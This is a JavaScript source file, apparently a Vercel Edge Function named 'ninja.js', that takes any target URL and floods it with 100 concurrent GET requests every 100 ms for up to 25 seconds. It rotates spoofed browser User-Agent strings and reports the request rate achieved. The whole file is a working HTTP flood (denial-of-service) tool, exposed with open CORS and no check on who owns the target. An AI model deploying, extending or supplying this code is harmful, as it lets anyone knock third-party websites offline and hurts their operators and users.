// api/ninja.js — Vercel Edge Function
// Ported from ninja.js. 100 requests per 100 ms interval.
// Stops after <duration> seconds. Returns totals.

export const config = { runtime: 'edge' };

const UA = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
];

const pickUA = () => UA[Math.floor(Math.random() * UA.length)];

const CORS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type',
};

function jsonResponse(data, status = 200) {
  return new Response(JSON.stringify(data), {
    status,
    headers: { ...CORS, 'Content-Type': 'application/json' },
  });
}

async function runTick(target) {
  const promises = [];
  for (let i = 0; i < 100; i++) {
    promises.push(
      fetch(target, { method: 'GET', headers: { 'User-Agent': pickUA() } })
        .then(r => (r.status >= 200 && r.status < 500))
        .catch(() => false)
    );
  }
  const results = await Promise.allSettled(promises);
  let ok = 0;
  for (const r of results) if (r.status === 'fulfilled' && r.value) ok++;
  return ok;
}

export default async function handler(req) {
  if (req.method === 'OPTIONS') {
    return new Response(null, { status: 204, headers: CORS });
  }
  if (req.method !== 'POST') {
    return jsonResponse({ ok: false, msg: 'POST only' }, 405);
  }

  let body = {};
  try { body = await req.json(); } catch (e) { body = {}; }

  const target   = String(body.target || '').trim();
  const duration = Math.min(Math.max(parseInt(body.duration, 10) || 10, 1), 25);

  if (!/^https?:\/\//i.test(target)) {
    return jsonResponse({ ok: false, msg: 'bad target' }, 400);
  }

  const start = Date.now();
  const deadline = start + duration * 1000;
  let total = 0;
  let ticks = 0;

  while (Date.now() < deadline) {
    const ok = await runTick(target);
    total += ok;
    ticks++;
    await new Promise(r => setTimeout(r, 100));
  }

  const elapsed = ((Date.now() - start) / 1000).toFixed(2);

  return jsonResponse({
    ok: true,
    target,
    duration,
    sent: total,
    ticks,
    elapsed,
    rate: (total / (elapsed || 1)).toFixed(1),
  });
}
